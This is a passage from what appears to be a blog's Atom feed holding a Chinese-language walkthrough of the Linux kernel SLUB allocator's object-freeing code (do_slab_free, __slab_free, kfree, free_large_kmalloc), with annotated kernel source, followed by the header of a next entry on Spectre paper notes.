class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c">redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 确定当前的 per cpu slab. </span><br><span class="hljs-comment"> * cpu 可能在之后改变.但由于数据已经通过该指针获得，这并没问题.</span><br><span class="hljs-comment"> * 若我们在 cmpxchg 期间在同一 cpu 上，释放将会成功.</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/* 与 slab_alloc_node() 中在 barrier() 上的注释一样 */</span><br>barrier();<br><br><span class="hljs-comment">// 不属于 percpu slab，调用 __slab_free() 进行释放</span><br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>__slab_free(s, slab, head, tail_obj, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (USE_LOCKLESS_FAST_PATH()) &#123;<br>freelist = READ_ONCE(c-&gt;freelist);<br><br><span class="hljs-comment">// 直接将 percpu freelist 接到 tail_obj 后面</span><br>set_freepointer(s, tail_obj, freelist);<br><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>freelist, tid,<br>head, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_free&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Update the free list under the local lock */</span><br>local_lock(&amp;s-&gt;cpu_slab-&gt;lock);<br>c = this_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>tid = c-&gt;tid;<br>freelist = c-&gt;freelist;<br><br><span class="hljs-comment">// 直接将 percpu freelist 接到 tail_obj 后面</span><br>set_freepointer(s, tail_obj, freelist);<br>c-&gt;freelist = head;<br>c-&gt;tid = next_tid(tid);<br><br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br>&#125;<br>stat(s, FREE_FASTPATH);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-slab-free-：释放回对应的-slab（slow-path）"><a href="#II-slab-free-：释放回对应的-slab（slow-path）" class="headerlink" title="II. __slab_free()：释放回对应的 slab（slow path）"></a>II. __slab_free()：释放回对应的 slab（slow path）</h3><p>如果待释放对象不属于 percpu clab，则调用 <code>__slab_free()</code> 进行释放：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 处理慢速路径. 这可能会被频繁调用因为在大部分情况下对象比cpu slab生命周期更长</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 所以我们仍尝试减少缓存行的使用率. 拿取 slab lock 并释放对象即可.</span><br><span class="hljs-comment"> * 若不需要额外的 partial slab handling 我们便可立即返回.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __slab_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,<br><span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">int</span> cnt,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)<br><br>&#123;<br><span class="hljs-type">void</span> *prior;<br><span class="hljs-type">int</span> was_frozen;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>stat(s, FREE_SLOWPATH);<br></code></pre></td></tr></table></figure><p>首先还是 kfence 和 debug 相关，如果该 <code>kmem_cache</code> 设置了 <code>SLAB_DEBUG_FLAGS</code> 标志位则直接调用 <code>free_to_partial_list()</code> 后返回即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (kfence_free(head))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_SLUB_TINY) || kmem_cache_debug(s)) &#123;<br>free_to_partial_list(s, slab, head, tail, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后是一个 <code>do while</code> 循环，首先会将 <strong><code>待释放 freelist 所属 slab 的 freelist</code></strong> 连接到 <strong><code>待释放 freelist 的 tail object</code></strong> 后边，这里的 <code>new</code> 是一个栈上的临时 slab 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (unlikely(n)) &#123;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>n = <span class="hljs-literal">NULL</span>;<br>&#125;<br>prior = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br>set_freepointer(s, tail, prior);<br>new.counters = counters;<br>was_frozen = new.frozen;<br>new.inuse -= cnt;<br></code></pre></td></tr></table></figure><p>接下来检查是否  <strong><code>(所有的对象都*将*为空闲对象 || 原 slab 上无空闲对象) &amp;&amp; slab 未被冻结</code></strong> ，若满足该条件则：</p><ul><li>检查是否有 percpu partial slab 且原 slab 上无空闲对象（即 slab-&gt;freelist（也就是代码中的 <code>prior</code>）为 NULL）：<ul><li>若是，则设置 slab 将被冻结（<code>new.frozen=1</code>）</li><li>若否，则获取 slab 所对应的 <code>kmem_cache_node</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((!new.inuse || !prior) &amp;&amp; !was_frozen) &#123;<br><br><span class="hljs-keyword">if</span> (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) &#123;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab 之前不在链表上且将会部分为空</span><br><span class="hljs-comment"> * 我们可以推迟链表移动，而是反之将其冻结.</span><br><span class="hljs-comment"> */</span><br>new.frozen = <span class="hljs-number">1</span>;<br><br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">/* 需要从一个链表上取下 */</span><br><br>n = get_node(s, slab_nid(slab));<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 推测性地获取 list_lock.</span><br><span class="hljs-comment"> * 若 cmpxchg 未成功，则我们可能</span><br><span class="hljs-comment"> * 在不进行任何处理的情况下放弃 list_lock.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 否则 list_lock 将与其他处理器同步更新 slabs 链表</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>循环的终止条件用了一个 <code>cmpxchg_double_slab()</code> 函数，<del>套娃套得👴头昏眼花</del>，主要逻辑为：</p><ul><li><strong>对比 slab-&gt;freelist &#x3D;&#x3D; prior &amp;&amp; slab-&gt;counters &#x3D;&#x3D; counters，若是，则将 slab-&gt;freelist 设为 head 且将 slab-&gt;counters 设为 new.counters</strong>，该操作成功则返回 true，条件不符则返回 false</li></ul><p>成功了循环将会直接跳出：）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">while</span> (!cmpxchg_double_slab(s, slab,<br>prior, counters,<br>head, new.counters,<br><span class="hljs-string">&quot;__slab_free&quot;</span>));<br></code></pre></td></tr></table></figure><p>接下来检查<strong>该 slab 是否需要从一个 <code>kmem_cache_node</code> 的链表上取下，若否，</strong>则：</p><ul><li>若 slab 已经被冻结，stat() 一下（基本上等于啥都不做）</li><li>若 slab 需要被冻结 （<code>new.frozen</code> 为 true），调用 <code>put_cpu_partial()</code> 直接将 slab 放到 percpu partial 链表</li><li>释放工作完成，返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (likely(!n)) &#123;<br><br><span class="hljs-keyword">if</span> (likely(was_frozen)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 链表锁未被占用，因此不需要活跃任何链表.</span><br><span class="hljs-comment"> */</span><br>stat(s, FREE_FROZEN);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.frozen) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we just froze the slab then put it onto the</span><br><span class="hljs-comment"> * per cpu partial list.</span><br><span class="hljs-comment"> */</span><br>put_cpu_partial(s, slab, <span class="hljs-number">1</span>);<br>stat(s, CPU_PARTIAL_FREE);<br>&#125;<br><br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果 slab 上所有对象都被释放，且 node 上的 partial slab 数量已经超过 <code>kmem_cache-&gt;min_partial</code> ，<strong>这意味着这是一张完全空闲的 slab</strong>，接下来跳转到 <code>slab_empty</code> 标签，该标签对应代码块主要是：</p><ul><li>若 slab 上原来有空闲对象（位于 node partial 链表），则从 partial 链表移除</li><li>若 slab 上原来无空闲对象（位于 node full 链表），则从 full 链表移除</li><li><strong>最后调用 <code>discard_slab()</code> 释放这一张 slab</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))<br><span class="hljs-keyword">goto</span> slab_empty;<br><br><span class="hljs-comment">//...</span><br><br>slab_empty:<br><span class="hljs-keyword">if</span> (prior) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab on the partial list.</span><br><span class="hljs-comment"> */</span><br>remove_partial(n, slab);<br>stat(s, FREE_REMOVE_PARTIAL);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Slab must be on the full list */</span><br>remove_full(s, n, slab);<br>&#125;<br><br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, FREE_SLAB);<br>discard_slab(s, slab);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>若不满足上面的条件，则检查是否没有 percpu partial slab 且 slab 上原 freelist 为 NULL（即位于 node full 链表），若是则从 full 链表移除并添加到 node partial 链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Objects left in the slab. If it was not on the partial list before</span><br><span class="hljs-comment"> * then add it.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;<br>remove_full(s, n, slab);<br>add_partial(n, slab, DEACTIVATE_TO_TAIL);<br>stat(s, FREE_ADD_PARTIAL);<br>&#125;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure><p>至此， slub 算法的释放逻辑分析完毕</p><h2 id="二、kfree：通用的上层释放接口"><a href="#二、kfree：通用的上层释放接口" class="headerlink" title="二、kfree：通用的上层释放接口"></a>二、kfree：通用的上层释放接口</h2><p>正如同 <code>kmalloc()</code> 是最为通用的内核对象分配函数，与之相对应的释放函数便是 <code>kfree()</code> 了，这个函数其实主要就是 <code>__kmem_cache_free()</code> 的 wrapper，对于较大的对象则会用 <code>free_large_kmalloc()</code> 进行释放，如果 object 为 NULL 则直接返回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kfree - 释放之前分配的对象</span><br><span class="hljs-comment"> * @object: kmalloc 返回的指针.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若 @object 为 NULL, 则不会进行任何操作.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 不要释放不由 kmalloc() 分配的内存，否则会出问题.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">folio</span> *<span class="hljs-title">folio</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><br>trace_kfree(_RET_IP_, object);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(object)))<br><span class="hljs-keyword">return</span>;<br><br>folio = virt_to_folio(object);<br><span class="hljs-keyword">if</span> (unlikely(!folio_test_slab(folio))) &#123;<br>free_large_kmalloc(folio, (<span class="hljs-type">void</span> *)object);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>slab = folio_slab(folio);<br>s = slab-&gt;slab_cache;<br>__kmem_cache_free(s, (<span class="hljs-type">void</span> *)object, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(kfree);<br></code></pre></td></tr></table></figure><h3 id="I-folio-结构：一段物理、虚拟、逻辑上都连续的内存"><a href="#I-folio-结构：一段物理、虚拟、逻辑上都连续的内存" class="headerlink" title="I. folio 结构：一段物理、虚拟、逻辑上都连续的内存"></a>I. folio 结构：一段物理、虚拟、逻辑上都连续的内存</h3><p>注意到这里用了一个名为 <code>folio</code> 的结构体，其表示了<strong>一块物理、虚拟、逻辑上都连续的内存</strong>，  <em>其实本质上还是复用了 page 结构体，只不过这一次是将 page 转为 folio</em>  ，定义比较长这里就不贴代码了</p><p><code>virt_to_folio()</code> 首先会用 <code>virt_to_page()</code> 找到待释放对象虚拟地址对应的 <code>page</code> 结构体，之后用 <code>page_folio()</code> 将其转换为 folio 结构体——其实就是对于复合页而言会找到第一张页面，由此如果是复合页的话那说明是大 slab 所以会调用 <code>free_large_kmalloc()</code>，不是复合页说明是小 slab 所以会调用 <code>__kmem_cache_free()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> folio *<span class="hljs-title function_">virt_to_folio</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *x)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> virt_to_page(x);<br><br><span class="hljs-keyword">return</span> page_folio(page);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> page_folio(p)(_Generic((p),\</span><br><span class="hljs-meta">const struct page *:(const struct folio *)_compound_head(p), \</span><br><span class="hljs-meta">struct page *:(struct folio *)_compound_head(p)))</span><br></code></pre></td></tr></table></figure><p>然后 <code>folio_test_slab()</code> 其实是 <code>include/linux/page-flags.h</code> 里的拼接宏，这里就不深入展开了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">bool</span> folio_test_#<span class="hljs-meta">#lname(struct folio *folio)\</span><br><span class="hljs-meta">&#123; return test_bit(PG_##lname, folio_flags(folio, FOLIO_##policy)); &#125;\</span><br></code></pre></td></tr></table></figure><h3 id="II-free-large-kmalloc-：直接将页面释放回-buddy-system"><a href="#II-free-large-kmalloc-：直接将页面释放回-buddy-system" class="headerlink" title="II. free_large_kmalloc()：直接将页面释放回 buddy system"></a>II. free_large_kmalloc()：直接将页面释放回 buddy system</h3><p>正如对于大对象的分配 <code>kmalloc_large()</code> 会直接从 buddy system 请求内存一般，相对应的 <code>free_large_kmalloc()</code> 也会直接将页面释放回 buddy system：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_large_kmalloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> folio *folio, <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = folio_order(folio);<br><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(order == <span class="hljs-number">0</span>))<br>pr_warn_once(<span class="hljs-string">&quot;object pointer: 0x%p\n&quot;</span>, object);<br><br>kmemleak_free(object);<br>kasan_kfree_large(object);<br>kmsan_kfree_large(object);<br><br>mod_lruvec_page_state(folio_page(folio, <span class="hljs-number">0</span>), NR_SLAB_UNRECLAIMABLE_B,<br>      -(PAGE_SIZE &lt;&lt; order));<br>__free_pages(folio_page(folio, <span class="hljs-number">0</span>), order);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III-kmem-cache-free-：常规的释放函数"><a href="#III-kmem-cache-free-：常规的释放函数" class="headerlink" title="III. __kmem_cache_free()：常规的释放函数"></a>III. __kmem_cache_free()：常规的释放函数</h3><p><code>__kmem_cache_free()</code> 主要就是对 <code>slab_free()</code> 的 wrapper，不过会指定 tail 为 NULL：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __kmem_cache_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *x, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br>slab_free(s, virt_to_slab(x), x, <span class="hljs-literal">NULL</span>, &amp;x, <span class="hljs-number">1</span>, caller);<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>slab_free()</code> 则会最终调用到 <code>do_slab_free()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> <span class="hljs-title function_">slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">      <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">void</span> **p, <span class="hljs-type">int</span> cnt,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br>memcg_slab_free_hook(s, slab, p, cnt);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * With KASAN enabled slab_free_freelist_hook modifies the freelist</span><br><span class="hljs-comment"> * to remove objects, whose reuse must be delayed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (slab_free_freelist_hook(s, &amp;head, &amp;tail, &amp;cnt))<br>do_slab_free(s, slab, head, tail, cnt, addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用到了一个函数 <code>slab_free_freelist_hook()</code>，主要的作用是遍历待释放的 freelist：</p><ul><li>如果设置了 free hook（ <code>slab_free_hook() == true</code> ），则仅减少计数以推迟释放</li><li>否则重新建立一遍 freelist 后返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">slab_free_freelist_hook</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params">   <span class="hljs-type">void</span> **head, <span class="hljs-type">void</span> **tail,</span><br><span class="hljs-params">   <span class="hljs-type">int</span> *cnt)</span><br>&#123;<br><br><span class="hljs-type">void</span> *object;<br><span class="hljs-type">void</span> *next = *head;<br><span class="hljs-type">void</span> *old_tail = *tail ? *tail : *head;<br><br><span class="hljs-keyword">if</span> (is_kfence_address(next)) &#123;<br>slab_free_hook(s, next, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">/* Head and tail of the reconstructed freelist */</span><br>*head = <span class="hljs-literal">NULL</span>;<br>*tail = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">do</span> &#123;<br>object = next;<br>next = get_freepointer(s, object);<br><br><span class="hljs-comment">/* If object&#x27;s reuse doesn&#x27;t have to be delayed */</span><br><span class="hljs-keyword">if</span> (!slab_free_hook(s, object, slab_want_init_on_free(s))) &#123;<br><span class="hljs-comment">/* Move object to the new freelist */</span><br>set_freepointer(s, object, *head);<br>*head = object;<br><span class="hljs-keyword">if</span> (!*tail)<br>*tail = object;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adjust the reconstructed freelist depth</span><br><span class="hljs-comment"> * accordingly if object&#x27;s reuse is delayed.</span><br><span class="hljs-comment"> */</span><br>--(*cnt);<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (object != old_tail);<br><br><span class="hljs-keyword">if</span> (*head == *tail)<br>*tail = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> *head != <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、上层调用接口关系图-1"><a href="#三、上层调用接口关系图-1" class="headerlink" title="三、上层调用接口关系图"></a>三、上层调用接口关系图</h2><p>涉及到内存释放的函数相较于内存分配其实少很多，常用的主要就是 <code>kfree()</code>、<code>kfree_sensitive()</code>、<code>kmem_cache_free()</code> 这三大函数：</p><p><img src="https://s2.loli.net/2023/02/24/Itbqo2eO15yn7ZW.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;别人问你哪里丑态你再把他反手挂到自己的小 slub 里寻求认同&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="https://arttnba3.github.io/categories/OS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="操作系统" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="内存管理" scheme="https://arttnba3.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="slub allocator" scheme="https://arttnba3.github.io/tags/slub-allocator/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x01】论文笔记：Hunting the Haunter — Efficient Relational Symbolic Execution for Spectre with Haunted RelSE </title>
    <link href="https://arttnba3.github.io/2023/01/29/PAPER-0X01-HUNTING_THE_HAUNTER-EFFICIENT_RELATIONAL_SYMBOLIC_EXECUTION_FOR_SPECTRE_WITH_HAUNTED_RELSE/"/>
    <id>https://arttnba3.github.io/2023/01/29/PAPER-0X01-HUNTING_THE_HAUNTER-EFFICIENT_RELATIONAL_SYMBOLIC_EXECUTION_FOR_SPECTRE_WITH_HAUNTED_RELSE/</id>
    <published>2023-01-28T15:37:51.000Z</published>
    <updated>2023-04-23T16:40:42.000Z</updated>
    
